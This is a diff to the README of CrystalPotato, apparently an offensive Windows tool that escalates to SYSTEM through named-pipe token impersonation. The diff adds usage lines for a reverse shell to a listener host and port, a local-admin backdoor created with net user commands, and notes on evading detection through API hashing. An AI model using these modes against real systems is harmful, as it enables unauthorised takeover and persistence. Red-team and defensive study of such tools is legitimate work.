@@ -59,7 +59,7 @@ The privilege escalation chain used by CrystalPotato (and the original GodPotato
 
 4. **Token capture**: When SYSTEM connects to the named pipe, `ImpersonateNamedPipeClient` captures its security context. The tool then enumerates all system handles to find a SYSTEM token with `Impersonation` level and sufficient integrity, duplicates it, and uses it to create a new process via `CreateProcessAsUserW` (falling back to `CreateProcessWithTokenW`).
 
-The entire chain runs in-process with no child process spawned until the final command execution.
+The entire chain runs in-process with no child process spawned until the final action. Once the SYSTEM token is obtained, CrystalPotato supports three modes: **command execution** (run a command and capture its output), **reverse shell** (connect back to a listener and bridge a shell's I/O over the socket), and **local admin creation** (`net user` + `net localgroup Administrators`).
 
 
 <br>
@@ -103,7 +103,7 @@ Beyond syscalls, CrystalPotato also resolves all sensitive Win32 API functions d
 
 Resolution works by walking the PEB to find each DLL's base address, then parsing its export table and matching function names against precomputed DJB2 hashes. The DJB2 hash function uses uppercase normalization (`h = 5381; h = ((h << 5) + h) + upper(c)`) so comparisons are case-insensitive.
 
-The only functions that remain in the IAT are those needed for COM marshaling (ole32), memory management (GlobalAlloc/Lock/Unlock), pipe creation for stdout capture (CreatePipe), and thread creation — none of which are individually suspicious.
+The only functions that remain in the IAT are those needed for COM marshaling (ole32), memory management (GlobalAlloc/Lock/Unlock), pipe creation for stdout capture (CreatePipe), thread creation, and Winsock networking for the reverse shell mode (ws2_32) — none of which are individually suspicious.
 
 <br>
 
@@ -149,13 +149,21 @@ crystal build CrystalPotato.cr -o CrystalPotato.exe --release --static
 
 ## Usage
 
+Execute a command, start a reverse shell, or create a local admin — all as SYSTEM.
+
 ```
 CrystalPotato.exe -c <COMMAND>
+CrystalPotato.exe -H <LHOST> -P <LPORT> [-c <SHELL>]
+CrystalPotato.exe -u <USER> -pw <PASS>
 ```
 
 | Flag | Description |
 |---|---|
-| `-c CMD` | Command to execute as SYSTEM (required) |
+| `-c CMD` | Command to execute as SYSTEM, or shell for reverse shell (default: `cmd.exe`) |
+| `-H HOST` | Reverse shell listener host |
+| `-P PORT` | Reverse shell listener port |
+| `-u USER` | Create local admin — username |
+| `-pw PASS` | Create local admin — password |
 | `-p NAME` | Custom pipe name (default: `Crystal`) |
 | `-d` | Debug output |
 | `-dd` | Full trace |
